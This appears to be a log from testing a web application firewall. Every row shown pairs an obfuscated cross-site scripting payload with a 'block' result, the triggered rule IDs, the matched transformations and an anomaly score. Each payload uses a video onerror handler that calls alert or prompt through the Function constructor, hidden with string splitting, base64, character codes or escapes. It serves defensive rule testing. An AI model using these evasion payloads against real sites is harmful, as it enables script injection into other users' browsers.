3875,"<video><source onerror=""(new Function('al'+'ert(1)'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o25,13v217,57 || o25,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603757577.802509
3877,"<video><source onerror=""(Function.prototype.constructor.call(null,'al'+'ert(1)'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603757875.080196
3879,"<video><source onerror=""(new(Function)('al'+'ert(1)'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o24,32v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603758192.313843
3880,"<video><source onerror=""(new/**/Function('al'+'ert(1)'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760375828.284608
3882,"<video><source onerror=""(new Function('al\u0065rt(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,59 || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760375851.527932
3883,"<video><source onerror=""(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603758745.841830
3884,"<video><source onerror=""(new Function(['al','ert(1)'].join('')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603758889.470116
3885,"<video><source onerror=""(new Function(atob('YWxlcnQoMSk')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603758992.322984
3886,"<video><source onerror=""(new Function('al'+String.fromCharCode(101)+'rt(1)'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o25,13v217,81 || o25,13v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760375914.104034
3888,"<video><source onerror=""(new Function(['al','e','r','t','(',1,')'].join``))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603759497.943570
3889,"<video><source onerror=""(new Function('al\145rt(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,57 || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603759555.463832
3891,"<video><source onerror=""(new Function('eva'+'l(atob`YWxlcnQoMSk`)'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760375972.772092
3892,"<video><source onerror=""(new Function(/*!*/`al${'ert(1)'}`/*!*/))()"">",0,1,block,7,"932130,934100,941100,941120,941160,942500,949110","o45,9v217,69t:urlDecodeUni,t:cmdLine || o25,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,5v217,69t:urlDecodeUni || ",30,17760375994.153400
3894,"<video><source onerror=""(new Function.prototype.constructor('al'+'ert(1)'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603760217.253875
3896,"<video><source onerror='(new(self.Function)(""retu""+""rn aler""+""t""))()(1)' src='#'></video>",0,1,block,5,"933210,941100,941120,941160,949110","o24,47v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,77v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603760547.079442
3899,"<video><source onerror='(new(Function.constructor)(""a""+""lert(1)""))()' src='#'></video>",0,1,block,5,"933210,941100,941120,941160,949110","o24,44v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,74v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603760988.249878
3904,"<video><source onerror='Function(""ret""+""urn ale""+""rt"")()(1)' src='#'></video>",0,1,block,7,"933210,941100,941120,941160,942100,942100,949110","o32,27v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,65v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,77 || v217,77t:urlDecodeUni || ",30,177603761695.831683
3905,"<video><source onerror='(new(top.Function)(""retu""+""rn pro""+""mpt""))()(1)' src='#'></video>",0,1,block,5,"933210,941100,941120,941160,949110","o24,47v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,77v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603761818.640695
